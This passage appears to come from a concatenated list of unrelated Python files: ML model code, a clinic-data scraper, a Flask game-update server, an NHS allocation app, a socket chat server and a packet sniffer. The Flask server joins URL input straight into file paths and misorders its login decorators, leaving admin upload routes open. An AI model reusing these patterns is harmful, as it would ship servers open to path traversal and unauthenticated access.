num_classes = 10\n    one_hot_encoding = F.one_hot(torch.tensor(target),num_classes)\n    return one_hot_encoding\n\n\n\n\n\ndef imshow(img):\n    img = img / 2 + 0.5  # Unnormalize\n    npimg = img.numpy()\n    if npimg.shape[0] == 1:# Determine the number of color channels (1 for grayscale, 3 for RGB)\n        plt.imshow(npimg[0], cmap='gray')# Grayscale image (1 channel): Convert to 2D array (H x W)\n    else:# RGB image (3 channels): Transpose the array to (H x W x C) and display\n        plt.figure(figsize=(10,10))\n        plt.imshow(np.transpose(npimg, (1, 2, 0)))\n        \n    plt.show()\n    plt.axis('off')\n\n\nif __name__ == \"__main__\":\n    print('in main')",
    "#!/usr/bin/env python\n# coding: utf-8\n\n# In[3]:\n\n\nimport math\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torch_geometric.data import Data\nfrom GraphGAT import GraphGAT\nfrom Attention import MultimodalAttention\n\nclass MPGAT(torch.nn.Module):\n    def __init__(self, features, edge_index, batch_size, num_user, num_item, dim_x=64):\n        super(MPGAT, self).__init__()\n        self.batch_size = batch_size\n        self.num_user = num_user\n        self.num_item = num_item\n\n        self.edge_index = torch.tensor(edge_index).t().contiguous().cuda()\n        self.edge_index = torch.cat((self.edge_index, self.edge_index[[1,0]]), dim=1)\n        \n        v_feat, a_feat, t_feat = features\n        self.v_feat = torch.tensor(v_feat, dtype=torch.float).cuda()\n        self.a_feat = torch.tensor(a_feat, dtype=torch.float).cuda()\n        self.t_feat = torch.tensor(t_feat, dtype=torch.float).cuda()\n\n        self.v_gnn = GNN(self.v_feat, self.edge_index, batch_size, num_user, num_item, dim_x, dim_latent=256)\n        self.a_gnn = GNN(self.a_feat, self.edge_index, batch_size, num_user, num_item, dim_x, dim_latent=128)\n        self.t_gnn = GNN(self.t_feat, self.edge_index, batch_size, num_user, num_item, dim_x, dim_latent=100)\n\n        self.id_embedding = nn.Embedding(num_user+num_item, dim_x)\n        nn.init.xavier_normal_(self.id_embedding.weight)\n\n        #self.id_embedding = nn.init.xavier_normal_(torch.rand((num_user+num_item, dim_x), requires_grad=True)).cuda()\n        self.result_embed = nn.init.xavier_normal_(torch.rand((num_user+num_item, dim_x))).cuda()\n\n    \n    def forward(self, user_nodes, pos_items, neg_items):\n        v_rep = self.v_gnn(self.id_embedding)\n        a_rep = self.a_gnn(self.id_embedding)\n        t_rep = self.t_gnn(self.id_embedding)\n        # \u4f7f\u7528\u6ce8\u610f\u529b\u673a\u5236\u878d\u5408\u6a21\u6001\n        representation = self.multimodal_attention(v_rep, a_rep, t_rep)\n        self.result_embed = representation\n        user_tensor = representation[user_nodes]\n        pos_tensor = representation[pos_items]\n        neg_tensor = representation[neg_items]\n        pos_scores = torch.sum(user_tensor * pos_tensor, dim=1)\n        neg_scores = torch.sum(user_tensor * neg_tensor, dim=1)\n        return pos_scores, neg_scores\n\n\n    def loss(self, data):\n        user, pos_items, neg_items = data\n        pos_scores, neg_scores = self.forward(user.cuda(), pos_items.cuda(), neg_items.cuda())\n        loss_value = -torch.sum(torch.log2(torch.sigmoid(pos_scores - neg_scores)))\n        return loss_value\n\n\n    def accuracy(self, dataset, topk=10, neg_num=1000):\n        all_set = set(list(np.arange(neg_num)))\n        sum_pre = 0.0\n        sum_recall = 0.0\n        sum_ndcg = 0.0\n        sum_item = 0\n        # bar = tqdm(total=len(dataset))\n\n        for data in dataset:\n            # bar.update(1)\n            if len(data) < 1002:\n                continue\n            sum_item += 1\n            user = data[0]\n            neg_items = data[1:1001]\n            pos_items = data[1001:]\n\n            batch_user_tensor = torch.tensor(user).cuda() \n            batch_pos_tensor = torch.tensor(pos_items).cuda()\n            batch_neg_tensor = torch.tensor(neg_items).cuda()\n\n            user_embed = self.result_embed[batch_user_tensor]\n            pos_v_embed = self.result_embed[batch_pos_tensor]\n            neg_v_embed = self.result_embed[batch_neg_tensor]\n\n            num_pos = len(pos_items)\n            pos_score = torch.sum(pos_v_embed*user_embed, dim=1)\n            neg_score = torch.sum(neg_v_embed*user_embed, dim=1)\n\n            _, index_of_rank_list = torch.topk(torch.cat((neg_score, pos_score)), topk)\n            index_set = set([iofr.cpu().item() for iofr in index_of_rank_list])\n            num_hit = len(index_set.difference(all_set))\n            sum_pre += float(num_hit/topk)\n            sum_recall += float(num_hit/num_pos)\n            ndcg_score = 0.0\n            for i in range(num_pos):\n                label_pos = neg_num + i\n                if label_pos in index_of_rank_list:\n                    index = list(index_of_rank_list.cpu().numpy()).index(label_pos)\n                    ndcg_score = ndcg_score + math.log(2) / math.log(index + 2)\n            sum_ndcg += ndcg_score/num_pos\n        # bar.close()\n\n        return sum_pre/sum_item, sum_recall/sum_item, sum_ndcg/sum_item\n\nclass GNN(torch.nn.Module):\n    def __init__(self, features, edge_index, batch_size, num_user, num_item, dim_id, dim_latent=None):\n        super(GNN, self).__init__()\n        self.batch_size = batch_size\n        self.num_user = num_user\n        self.num_item = num_item\n        self.dim_id = dim_id\n        self.dim_feat = features.size(1)\n        self.dim_latent = dim_latent\n        self.edge_index = edge_index\n        self.features = features\n\n        self.preference = nn.Embedding(num_user, self.dim_latent)\n        nn.init.xavier_normal_(self.preference.weight).cuda()\n        if self.dim_latent:\n            #self.preference = nn.init.xavier_normal_(torch.rand",
    "from htmlnode import LeafNode\nclass TextNode:\n    def __init__(self, text :str, text_type :str, url :str=None):\n        self.text = text\n        self.text_type = text_type\n        self.url = url\n        \n    def __eq__(self, other):\n        return self.text == other.text and self.text_type == other.text_type and self.url == other.url\n    \n    def __repr__(self):\n        return f\"TextNode( {self.text}, {self.text_type}, {self.url} )\"\n    \nallowed_types = {\n                \"text_type_text\", \n                 \"text_type_bold\", \n                 \"text_type_italic\", \n                 \"text_type_code\", \n                 \"text_type_link\", \n                 \"text_type_image\"\n                 }\n\n\ndef text_node_to_html_node(text_node):\n    if not isinstance(text_node, TextNode):\n        raise ValueError(\"Invalid text node - provide node of TextNode class\")\n    if text_node.text_type not in allowed_types:\n        raise ValueError(\"Invalid text type\")\n    if text_node.text_type[10:] == \"text\":\n        return LeafNode(value=text_node.text)\n    if text_node.text_type[10:] == \"bold\":\n        return LeafNode(tag=\"b\", value=text_node.text)\n    if text_node.text_type[10:] == \"italic\":\n        return LeafNode(tag=\"i\", value=text_node.text)\n    if text_node.text_type[10:] == \"code\":\n        return LeafNode(tag=\"code\", value=text_node.text)\n    \n\n    if text_node.text_type[10:] == \"link\":\n        \"\"\"Provide anchor text and href properties\"\"\"\n\n        return LeafNode(tag=\"a\", value=text_node.text, props={\"href\": text_node.url})\n    \n    if text_node.text_type[10:] == \"image\":\n        \"\"\"Provide image source and alt properties\n        By default, value set to empty string\n        Give image url in src property\n        Give image alt text in alt property\"\"\"\n        return LeafNode(tag=\"img\", value=\"\", props={\"src\": text_node.url, \"alt\": text_node.text})\n    \n\ndef split_nodes_delimiter(old_nodes :list[object], delimiter :str, text_type :str) -> list[object]:\n    \"\"\"Takes a list of \"old nodes\", a delimiter, and a text type. Returns a new list of nodes, where any \"text\" type nodes in the input list are split into multiple nodes based on the syntax. The delimiter is not included in the output nodes.\"\"\"\n    pass\n",
    "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Wed Apr 10 16:34:27 2024\n\n@author: stan\n\nThis script is an example of data scraping for the site https://www.dentaldepartures.com/dentist/supreme-dental-clinic .\nThis script extract all clinics and associated city for a provided country\nThis script use an accessible backend API to extract data\nDisclamer:\nThis code is for educational/demonstrative purposes, and stated that I have no affiliation with the site and that neither \nI nor the software would be held liable for any consequences resulting from its use. \n\"\"\"\n\nimport requests\n\n            #############################\n            #                           #\n            # Parameters Initialization #\n            #                           #\n            #############################\n            \nCOUNTRY='mexico' #This parameter is used as a country filter in the API query \nPAGE_SIZE=600    #This parameter is used to setup the number of data extracted for each call. The first page is limited to 10\nPAGE=1           #This parameter is used to setup th start page used in the script\nFILENAME=\"mexico_extract.csv\" # This parameter is used to define the output filename\n\n\n\nall_clinic=[]    #Initliaze an empty list which will store all clinic data\n\n\n            #############################\n            #                           #\n            #     Usefull Functions     #\n            #                           #\n            #############################\n\n\ndef convert_to_csv(data):\n    \"\"\"\n    A function that convert a provided table to a csv\n    This function is used in the script to convert extracted data stored in a list to a csv format\n    \"\"\"\n    csv_data = \"\"\n    for row in data:\n        csv_data += \",\".join(map(str, row)) + \"\\n\"\n    return csv_data\n\n\n            #############################\n            #                           #\n            #     Data Extraction       #\n            #                           #\n            #############################\n\n\nend=False #This flag is used to monitor if all data are extracted\n\nwhile(not(end))  :\n    #BACKEND URL usedby dentaldepartures to get data\n    API_URL = \"https://stagl-api.medicaldepartures.com/keendex/v1/static-clinic-search?treatment=&country=mexico&province=&city=&page=\"+str(PAGE)+\"&size=\"+str(PAGE_SIZE)+\"&sort=recommended\"\n    if PAGE==1:\n        size=10\n    else:\n        size=600\n\n\n    #Initilize the query API header query\n    headers = {\n        \"Origin\": \"https://www.dentaldepartures.com\",\n        \"Referer\":\"https://www.dentaldepartures.com/\",\n        \"X-SITE-ID\":\"1\"\n               \n    }\n    \n    #Send the query to get data\n    response = requests.get(API_URL, headers=headers) \n    \n    #Check if the query is a success and if the response is empty\n    \n    if( response.status_code ==200 and 'res' in response.json()  and len(response.json()['res']['search_result'])>0):\n        all_result=response.json()['res']['search_result']\n    else:\n        end=True\n    if(not end):\n        if response.status_code == 200:\n         \n            #Parse response json to extract clinic name and associated city\n            for i in range(len(all_result)):     \n                name=all_result[i]['name']\n                if len(all_result[i]['i18n'][0])>0:\n                    try:\n                        city=all_result[i]['i18n'][0]['location']['city']['name']\n                    except:\n                        city='NO INFO' #If the City is empty we replace it by NO INFO\n                 \n                    all_clinic.append([name,city])\n                else:\n                    all_clinic.append([name,'NO INFO'])\n           \n        else:\n           \n            print(\"The query failed, error code :\", response.status_code)\n        \n        PAGE+=1\n\n\n\n\n# Remove Duplicate\nunique_tuples = set(tuple(row) for row in all_clinic)\n\n# Convert the unique tuples back to lists\nall_clinic = [list(row) for row in unique_tuples]\n\n# Add title for each column in CSV\ncsv_with_title = \"Clinic Name,City\\n\" + convert_to_csv(all_clinic[1:])  # Skip the first row\n\n\n#Save data in the file with the provided filename\nwith open(FILENAME, \"w\",encoding='utf-8') as f:\n   f.write(csv_with_title)",
    "# from huggingface_hub import snapshot_download\n\n# snapshot_download(repo_id=\"runwayml/stable-diffusion-v1-5\",local_dir='D:/stable-diffusion-v1-5',resume_download=True,proxies='127.0.0.1:7890')\n\nimport os\nfrom huggingface_hub import snapshot_download\n# \u5982\u679c\u9700\u8981\u4ee3\u7406\u7684\u8bdd\uff0c\u53bb\u6389\u6b64\u90e8\u5206\u6ce8\u91ca\u52a0\u5165\u7aef\u53e3\nos.environ[\"https_proxy\"] = \"127.0.0.1:7890\" # \u4ee3\u7406\u8bbe\u7f6e\n# os.environ[\"http_proxy\"] = \"http://xxxxxxx:xxxx\" # \u4ee3\u7406\u8bbe\u7f6e\nrepo_id = \"yangtao9009/DIV2K\" # \u6a21\u578b\u5728huggingface\u4e0a\u7684\u540d\u79f0\ncache_dir = \"./cache/\"\nlocal_dir = \"D:/DIV2K\"\n# \u6307\u5b9a\u8981\u521b\u5efa\u7684\u76ee\u5f55\u8def\u5f84\n\nlocal_dir_use_symlinks = False # \u672c\u5730\u6a21\u578b\u4f7f\u7528\u6587\u4ef6\u4fdd\u5b58\uff0c\u800c\u975eblob\u5f62\u5f0f\u4fdd\u5b58\n#\n# token = \"XXXXXXXXXX\" # \u5728hugging face\u4e0a\u751f\u6210\u7684 access token\n\n# \u68c0\u67e5\u76ee\u5f55\u662f\u5426\u5b58\u5728\nif not os.path.exists(cache_dir):\n # \u521b\u5efa\u76ee\u5f55\n    os.makedirs(cache_dir)\n#\nif not os.path.exists(local_dir):\n # \u521b\u5efa\u76ee\u5f55\n    os.makedirs(local_dir)\n#\nsnapshot_download(\n repo_id=repo_id,\n repo_type='dataset',#Accepted repo types are: [None, 'model', 'dataset', 'space']\n cache_dir=cache_dir,\n local_dir=local_dir,\n local_dir_use_symlinks=local_dir_use_symlinks,\n force_download=True,\n resume_download=True\n)\nprint(\"======Download successful=====\")\n",
    "import hashlib\nimport json\nimport random\nimport shutil\nimport threading\nimport time\nimport uuid\nfrom flask import Flask, render_template, make_response, jsonify, request, redirect, url_for, abort, send_from_directory\nfrom flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user\nfrom flask_bcrypt import Bcrypt\nimport os\nimport argparse\nfrom urllib.parse import parse_qs\nfrom collections import deque\nfrom datetime import datetime, timedelta\nfrom flask_sqlalchemy import SQLAlchemy\nfrom sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column\nfrom sqlalchemy.sql import func\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--port', type=int, default=5000)\nparser.add_argument('--debug', action='store_true')\n\nargs, _ = parser.parse_known_args()\n\napp = Flask(__name__)\napp.secret_key = open(\"flaskkey\", \"r\").read()\napp.config['MAX_CONTENT_LENGTH'] = 4000000000 # 4GB\n\nbcrypt = Bcrypt(app)\n\nlogin_manager = LoginManager(app)\nlogin_manager.login_view = '/'\n\n\nclass Base(DeclarativeBase):\n  pass\napp.config[\"SQLALCHEMY_DATABASE_URI\"] = \"sqlite:///cardwars.db\"\ndb = SQLAlchemy(model_class=Base)\ndb.init_app(app)\n\nbadcharaters = ['/', '\\\\', ':', '*', '?', '\"', '<', '>', '|', \";\", \"%\", \"^\", \"&\", \"(\", \")\", \"{\", \"}\", \"[\", \"]\"]\n\n@app.route(\"/persist/version.txt\")\ndef PersistVersion():\n\twith open(\"data/persist/version.txt\", \"r\") as f:\n\t\treturn f.read()\n\n@app.route(\"/persist/updater_version.txt\")\ndef PersistUpdaterVersion():\n\twith open(\"data/persist/updater_version.txt\", \"r\") as f:\n\t\treturn f.read()\n\nclass Admin(UserMixin, db.Model):\n\tusername: Mapped[str] = mapped_column(db.String(80), primary_key=True, unique=True, nullable=False)\n\tpassword: Mapped[str] = mapped_column(db.String(80), nullable=False)\n \n\tdef get_id(self):\n\t\treturn str(self.username)\n \n@login_manager.user_loader\ndef load_user(user_id):\n    return Admin.query.get(user_id)\n \n@app.route(\"/admin\", methods=['GET', 'POST'])\ndef AdminPage():\n\tif request.method == 'GET':\n\t\tif current_user.is_authenticated:\n\t\t\treturn render_template('admin.html', matches=Matches, version=PersistVersion(), updater_version=PersistUpdaterVersion(), tournament=GetTorunamentData())\n\t\telse:\n\t\t\treturn render_template('login.html')\n\tif request.method == 'POST':\n\t\tusername = request.form['username']\n\t\tpassword = request.form['password']\n\t\tdb_user = Admin.query.filter_by(username=username).first()\n\t\tif db_user is None:\n\t\t\treturn make_response(\"Invalid Username!\", 400)\n\t\tif not bcrypt.check_password_hash(db_user.password, password):\n\t\t\treturn make_response(\"Invalid Password!\", 400)\n\t\tlogin_user(db_user)\n\t\treturn redirect(\"/admin\")\n\n@app.route(\"/admin/logout\")\ndef AdminLogout():\n\tlogout_user()\n\treturn redirect(\"/\")\n\n@login_required\n@app.route(\"/admin/generatemanifest/<string:version>\")\ndef AdminGenerateManifest(version):\n\tmanifest = {}\n\tfor root, dirs, files in os.walk(f\"data/game/files/windows/{version}\"):\n\t\tfor file in files:\n\t\t\tfile_path = os.path.join(root, file)\n\t\t\twith open(file_path, \"rb\") as f:\n\t\t\t\tcontent = f.read()\n\t\t\t\thash_value = hashlib.md5(content).hexdigest()\n\t\t\t\t#remove the beginning of the file path\n\t\t\t\tfile_path = file_path[len(f\"data/game/files/windows/{version}/\"):]\n\t\t\t\t#replace \\ with /\n\t\t\t\tfile_path = file_path.replace(\"\\\\\", \"/\")\n\t\t\t\tmanifest[file_path] = hash_value\n\t# Save the manifest to a file\n\tos.makedirs(f\"data/game/manifest/windows\", exist_ok=True)\n\twith open(f\"data/game/manifest/windows/{version}.json\", \"w\") as f:\n\t\tjson.dump(manifest, f, indent=4)\n\treturn make_response(\"OK\", 200)\n\n@app.route(\"/game/manifest/<string:platform>/<string:version>.json\")\ndef GameManifest(platform, version):\n\twith open(f\"data/game/manifest/{platform}/{version}.json\", \"r\") as f:\n\t\treturn f.read()\n\t\n@app.route(\"/game/files/<string:platform>/<string:version>/<string:file>\")\ndef GameFile(platform, version, file):\n    #replace ____ with /\n\tfile = file.replace(\"____\", \"/\")\n\tif os.path.exists(f\"data/game/files/{platform}/{version}/{file}\"):\n\t\treturn send_from_directory(directory=f\"data/game/files/{platform}/{version}\", path=file, as_attachment=True, download_name=file)\n\n@app.route(\"/updater/files/<string:platform>/<string:version>/<string:file>\")\ndef UpdaterFile(platform, version, file):\n\t#replace ____ with /\n\tfile = file.replace(\"____\", \"/\")\n\twith open(f\"data/updater/files/{platform}/{version}/{file}\", \"rb\") as f:\n\t\treturn f.read()\n\n@login_required\n@app.route(\"/admin/newbuild\", methods=['GET', 'POST'])\ndef AdminNewBuild():\n\tif request.method == \"POST\":\n\t\t#get form \n\t\tform = request.form\n\t\tform = {k: v[0] if len(v) == 1 else v for k, v in form.items()}\n\t\tprint(form)\n  \n\t\tos.makedirs(f\"data/game/files/windows/{form['version']}\", exist_ok=True)\n  \n\t\t#get files\n\t\tfor file in request.files:\n\t\t\twith open(f\"data/game/files/windows/{form['version']}/windows.zip\", \"wb\") as f:\n\t\t\t\tf.write(request.files[file].read())\n    \n\t\t#unzip\n\t\timport zipfile\n\t\twith zipfile.ZipFile(f\"data/game/files/windows/{form['version']}/windows.zip\", 'r') as zip_ref:\n\t\t\tzip_ref.extractall",
    "'''\n@author: peter.saiu@nhs.net\nCreated: 2024\nversion: 0.0.1\n\nDescription: \nThe code in this streamlit script allows you to run the allocation calculations based on the \nuser's preferences. \n\nAcknowledgements: Dan Chalk, Sammi Rosser, John Ford, Shylaja Thomas, Fiona Head, \nBen Jackson and Luke Natali.\n\n'''\n\nimport streamlit as st\nimport pandas as pd\nimport plotly.graph_objects as go\nfrom  indicators_n_pop_data_23_24 import indicators_qox, indicators_qhg, indicators_qhl, \\\n    indicators_qua, indicators_quy, indicators_qu9, indicators_que, indicators_qyg, indicators_qt6, \\\n    indicators_qwu, indicators_qj2, indicators_qjk, indicators_qvv, indicators_qnq, indicators_qr1, \\\n    indicators_qop, indicators_qrl, indicators_qgh, indicators_qm7, indicators_qoq, indicators_qks, \\\n    indicators_qe1, indicators_qk1, indicators_qjm, indicators_qh8, indicators_qmm, indicators_qmj, \\\n    indicators_qhm, indicators_qmf, indicators_qrv, indicators_qpm, indicators_qt1, indicators_qoc, \\\n    indicators_qsl, indicators_qkk, indicators_qwe, indicators_qf7, indicators_qnc, indicators_qjg, \\\n    indicators_qxu, indicators_qnx, indicators_qwo\nfrom indicators_n_pop_data_23_24 import m_pop_qox, m_pop_qhg, m_pop_qhl, m_pop_qua, m_pop_quy, \\\n    m_pop_qu9, m_pop_que, m_pop_qyg, m_pop_qt6, m_pop_qwu, m_pop_qj2, m_pop_qjk, m_pop_qvv, \\\n    m_pop_qnq, m_pop_qr1, m_pop_qop, m_pop_qrl, m_pop_qgh, m_pop_qm7, m_pop_qoq, m_pop_qks, \\\n    m_pop_qe1, m_pop_qk1, m_pop_qjm, m_pop_qh8, m_pop_qmm, m_pop_qmj, m_pop_qhm, m_pop_qmf, \\\n    m_pop_qrv, m_pop_qpm, m_pop_qt1, m_pop_qoc, m_pop_qsl, m_pop_qkk, m_pop_qwe, m_pop_qf7, \\\n    m_pop_qnc, m_pop_qjg, m_pop_qxu, m_pop_qnx, m_pop_qwo\n\nfrom indicators_n_pop_data_23_24 import f_pop_qox, f_pop_qhg, f_pop_qhl, f_pop_qua, f_pop_quy, \\\n    f_pop_qu9, f_pop_que, f_pop_qyg, f_pop_qt6, f_pop_qwu, f_pop_qj2, f_pop_qjk, f_pop_qvv, \\\n    f_pop_qnq, f_pop_qr1, f_pop_qop, f_pop_qrl, f_pop_qgh, f_pop_qm7, f_pop_qoq, f_pop_qks, \\\n    f_pop_qe1, f_pop_qk1, f_pop_qjm, f_pop_qh8, f_pop_qmm, f_pop_qmj, f_pop_qhm, f_pop_qmf, \\\n    f_pop_qrv, f_pop_qpm, f_pop_qt1, f_pop_qoc, f_pop_qsl, f_pop_qkk, f_pop_qwe, f_pop_qf7, \\\n    f_pop_qnc, f_pop_qjg, f_pop_qxu, f_pop_qnx, f_pop_qwo\n\n\n# Set page configuration\nst.set_page_config(\n    page_title=\"eFIT\",\n    page_icon=\"https://www.england.nhs.uk/wp-content/themes/nhsengland/static/img/favicon.ico\",\n    layout=\"wide\",    # alternatively write \"centered\" \n    initial_sidebar_state=\"expanded\",\n    menu_items={\n        \"Get Help\": \"https://www.heec.co.uk/category/how-to-guide/\",            # amend web address\n#        \"Report a bug\": \"https://github.com/\",    # amend with web address of my GitHub page\n        \"About\": \"This tool is designed to support ICBs to calculate the allocation of extra funding to GP practices. Please refer to the 'About' tab in the sidebar for User Guide for instructions.\" \n    },)\n\n# The background colour is defined by the 'config' file in the '.streamlit' folder\n\n# This is to add in a title for our web app's page (not needed here as title is included in logo image)\n#st.title('Tool for ICBs to calculate the allocation of extra funding to primary care (at GP-level)')\n\n# ADD LOGO\nst.image('input_data_other/logos_n_name.png', width=750)\n\n\n#These 17 lines make you insert text from a 'markdown' file (text written as markdown) \n#by reading in the file\nINTRO_FILE = 'input_data_other/overview_gp.md'\ndef read_file_contents(file_name):\n    ''''\n    Read the contents of a file.\n    Params:\n    ------\n    file_name: str\n        Path to file.\n    Returns:\n    -------\n    str\n    '''\n    with open(file_name) as f:\n        return f.read()\n    \n# show the markdown\nst.markdown(read_file_contents(INTRO_FILE))\n################################################################################\n\nicb_list = ['Bath and North East Somerset, Swindon and Wiltshire ICB', 'Bedfordshire, Luton and Milton Keynes ICB',\n'Birmingham and Solihull ICB', 'Black Country ICB', 'Bristol, North Somerset and South Gloucestershire ICB',\n'Buckinghamshire, Oxfordshire and Berkshire West ICB', 'Cambridgeshire and Peterborough ICB',\n'Cheshire and Merseyside ICB', 'Cornwall and the Isles of Scilly ICB', 'Coventry and Warwickshire ICB',\n'Derby and Derbyshire ICB', 'Devon ICB', 'Dorset ICB', 'Frimley ICB', 'Gloucestershire ICB',\n'Greater Manchester ICB', 'Hampshire and Isle of Wight ICB', 'Herefordshire and Worcestershire ICB',\n'Hertfordshire and West Essex ICB', 'Humber and North Yorkshire ICB', 'Kent and Medway ICB',\n'Lancashire and South Cumbria ICB', 'Leicester, Leicestershire and Rutland ICB', 'Lincolnshire ICB',\n'Mid and South Essex ICB', 'Norfolk and Waveney ICB', 'North Central London ICB', \n'North East and North Cumbria ICB', 'North East London ICB', 'North West London ICB',\n'Northamptonshire ICB', 'Nottingham and Nottinghamshire ICB', 'Shropshire, Telford and Wrekin ICB',\n'Somerset ICB', 'South East London ICB', 'South West London ICB', 'South Yorkshire ICB',\n'Staffordshire and Stoke-on-Trent ICB',",
    "import socket\r\nimport threading\r\n\r\n\r\nlist_of_clients=[] #setting up list of clients\r\n\r\ndef handle_client(client_socket, addr):\r\n    try:\r\n        while True:\r\n            # receive adnd print client messages\r\n            request = client_socket.recv(1024).decode(\"utf-8\")\r\n            if request.lower() == \"close\":\r\n                client_socket.send(\"closed\".encode(\"utf-8\"))   #close client side\r\n                break\r\n            \r\n            print(f\"Received: {request}\")\r\n            \r\n            # convert and send accept response to the client\r\n            \"\"\"\r\n            response = \"accepted\"\r\n            client_socket.send(response.encode(\"utf-8\"))\r\n            \"\"\"\r\n            ##new additions\r\n            \r\n            message = request #so new code works\r\n            \r\n            print(\"<\" + addr[0] + \"> \" + message)   #prints server side\r\n            #message_to_send = \"<\" + addr[0] + \"> \" + message  #preparing message_to_send and broardcast to othr clients\r\n            #message_to_send = \"<\" + addr[0] + \"> \" + message\r\n            message_to_send = \"<Client> \" + message\r\n            broadcast(message_to_send,client_socket) #conn =! to client_socket so changed\r\n            #calls the function broadcast\r\n\r\n            \r\n    except Exception as e:\r\n        print(f\"Error when hanlding client: {e}\") #error just in case ;)\r\n    finally:\r\n        client_socket.close()\r\n        print(f\"Connection to client ({addr[0]}:{addr[1]}) closed\")  #ends connection with that client\r\n\r\ndef broadcast(message_to_send,connection):\r\n    message = message_to_send\r\n    for clients in list_of_clients: #chescks through all clients\r\n        if clients!=connection:     #if not the main client, eg 1 sends message\r\n            try:\r\n                clients.send(message.encode(\"utf-8\"))\r\n            except:\r\n                \r\n                clients.close()\r\n                \r\n                #remove(clients)\r\n\r\n\r\ndef run_server():\r\n    server_ip = \"0.0.0.0\"  # server hostname or IP address\r\n    port = 8000  # server port number\r\n    # create a socket object\r\n    try:\r\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        # bind the socket to the host and port\r\n        server.bind((server_ip, port))\r\n        # listen for incoming connections\r\n        server.listen()\r\n        print(f\"Listening on {server_ip}:{port}\")\r\n\r\n        while True:\r\n            # accept a client connection\r\n            client_socket, addr = server.accept()\r\n            list_of_clients.append(client_socket)\r\n            print(f\"Accepted connection from {addr[0]}:{addr[1]}\")\r\n            # start a new thread to handle the client\r\n            thread = threading.Thread(target=handle_client, args=(client_socket, addr,))\r\n            thread.start()\r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n    finally:\r\n        server.close()\r\n\r\n\r\n\r\nrun_server()\r\n\r\n\r\n\r\n\"\"\"\r\ndef broadcast(message,connection):\r\n    for clients in list_of_clients:\r\n        if clients!=connection:\r\n            try:\r\n                clients.send(message)\r\n            except:\r\n                \r\n                clients.close()\r\n                remove(clients)\r\n\"\"\"\r\n",
    "# Import necessary libraries\r\nimport socket  # For resolving port numbers to service names\r\nfrom scapy.all import sniff  # For packet sniffing\r\nfrom scapy.layers.inet import TCP, UDP, IP  # For working with TCP, UDP, and IP packets\r\nfrom datetime import datetime  # For converting packet timestamps to human-readable format\r\n\r\n# Function to get the application protocol based on the packet's transport layer\r\ndef get_application_protocol(packet):\r\n    # Check if the packet is TCP\r\n    if packet.haslayer(TCP):\r\n        port = packet[TCP].dport  # Get the destination port number\r\n    # Check if the packet is UDP\r\n    elif packet.haslayer(UDP):\r\n        port = packet[UDP].dport  # Get the destination port number\r\n    else:\r\n        return None  # Return None if the transport layer protocol is neither TCP nor UDP\r\n\r\n    try:\r\n        # Try to resolve the port number to the corresponding service name\r\n        return socket.getservbyport(port)\r\n    except OSError:\r\n        return None  # Return None if the service name cannot be resolved\r\n\r\n# Callback function to process each sniffed packet\r\ndef packet_callback(packet):\r\n    # Extract source and destination IP addresses from the packet\r\n    if IP in packet:\r\n        src_ip = packet[IP].src\r\n        dst_ip = packet[IP].dst\r\n    else:\r\n        src_ip = \"N/A\"\r\n        dst_ip = \"N/A\"\r\n\r\n    transport_proto = None  # Initialize transport protocol to None\r\n    src_port = \"N/A\"  # Initialize source port to \"N/A\"\r\n    dst_port = \"N/A\"  # Initialize destination port to \"N/A\"\r\n\r\n    # Check if the packet is TCP\r\n    if packet.haslayer(TCP):\r\n        transport_proto = 'TCP'  # Set transport protocol to TCP\r\n        src_port = packet[TCP].sport  # Get the source port number\r\n        dst_port = packet[TCP].dport  # Get the destination port number\r\n    # Check if the packet is UDP\r\n    elif packet.haslayer(UDP):\r\n        transport_proto = 'UDP'  # Set transport protocol to UDP\r\n        src_port = packet[UDP].sport  # Get the source port number\r\n        dst_port = packet[UDP].dport  # Get the destination port number\r\n\r\n    # Get the application protocol based on the packet's transport layer\r\n    application_proto = get_application_protocol(packet)\r\n\r\n    # Get the length of the packet\r\n    packet_length = len(packet)\r\n\r\n    # Convert the packet timestamp to a human-readable format\r\n    timestamp = datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S')\r\n\r\n    # Print packet details\r\n    print(\"Packet Details:\")\r\n    print(f\"  Source IP: {src_ip}\")\r\n    print(f\"  Destination IP: {dst_ip}\")\r\n    print(f\"  Source Port: {src_port}\")\r\n    print(f\"  Destination Port: {dst_port}\")\r\n    print(f\"  Transport Protocol: {transport_proto}\")\r\n    print(f\"  Application Protocol: {application_proto}\")\r\n    print(f\"  Packet Length: {packet_length}\")\r\n    print(f\"  Timestamp: {timestamp}\")\r\n\r\n# Function to start packet sniffing on a specified interface\r\ndef start_sniffing(interface):\r\n    # Start sniffing packets on the specified interface\r\n    sniff(iface=interface, prn=packet_callback, store=False)\r\n\r\n# Entry point of the program\r\nif __name__ == \"__main__\":\r\n    interface = \"Wi-Fi\"  # Change this to the name of your network interface\r\n    start_sniffing(interface)  # Start sniffing packets on the specified interface\r\n",
    "from random import randint, choice\nfrom os import system, path\nfrom time import sleep\n\n#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#\n\ndef has(var, list): # Saj\u00e1t \"in\"\n    for e in list:\n        if e == var:\n            return True\n    return False\n\ndef valid_choice(var, list):\n    while not has(var, list):\n        var = input(\"Nincs ilyen opci\u00f3!\\nV\u00e1lassz m\u00e1st: \")\n    return var\n\ndef combine(x): # Saj\u00e1t ''.join \n    y = \"\"\n    for e in x:\n        y += e\n    return y\n\ndef areusure(text): # \"y\" vagy \"n\" bemenet, ha y akkor visszat\u00e9r Igazzal ha nem akkor Hamissal\n    good = [\"y\", \"n\"]\n    response = input(text[6])\n    response = valid_choice(response, good)\n\n    if response == \"y\":\n        return True\n    else:\n        return False\n\ndef load_text(x): # Bet\u00f6lti a sz\u00f6veget amit haszn\u00e1lunk a text.txt \u00e1llom\u00e1nyb\u00f3l\n    fr = open(\"text.txt\", \"r\", encoding=\"UTF-8\")\n    line = fr.readline()\n    current = []\n    while line != \"\":\n        if line == \"---\\n\":\n            x.append(combine(current).rstrip(\"\\n\")) # rstrip --> RIGHT strip, leszedi a sz\u00f6veg jobb oldal\u00e1r\u00f3l (v\u00e9g\u00e9r\u0151l) a whitespacet\n            current = [] # Van \"---\\\"? --> 